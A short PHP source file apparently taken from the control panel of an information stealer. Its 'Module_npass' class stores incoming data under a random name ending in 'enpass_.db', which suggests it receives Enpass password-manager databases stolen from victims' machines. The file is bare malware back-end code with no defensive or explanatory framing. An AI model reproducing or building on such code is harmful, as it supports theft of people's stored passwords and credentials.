<?php

	class Module_npass extends Module_
	{
		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
				case 0:
				{
					$this->insert_downloads(MakeRandomString(10, TRUE) . "enpass_.db",  $Data);
					break;
				}
				default:
					return FALSE;
			}
			
			return TRUE;
		}
	}
